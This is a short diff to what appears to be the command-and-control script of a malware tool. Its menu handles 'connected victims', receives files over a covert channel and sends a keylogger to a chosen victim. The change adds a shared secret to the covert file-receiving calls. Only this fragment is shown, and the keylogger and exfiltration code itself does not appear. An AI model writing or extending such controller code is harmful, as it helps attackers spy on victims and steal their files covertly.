@@ -143,7 +143,7 @@ if __name__ == '__main__':
                         else:
                             choices = protocol_and_field_selector()  # => For covert channel
                             receive_file_covert(client_socket, client_ip, client_port,
-                                                source_ip, source_port, choices)
+                                                source_ip, source_port, choices, shared_secret)
 
                     # CASE 3: Send keylogger to any specific connected victim
                     elif len(connected_clients) != constants.ZERO:
@@ -168,7 +168,7 @@ if __name__ == '__main__':
                         elif target_socket:
                             choices = protocol_and_field_selector()  # => For covert channel
                             receive_file_covert(target_socket, target_ip, target_port,
-                                                source_ip, source_port, choices)
+                                                source_ip, source_port, choices, shared_secret)
                         else:
                             print(constants.TARGET_VICTIM_NOT_FOUND)
                             print(constants.RETURN_MAIN_MENU_MSG)
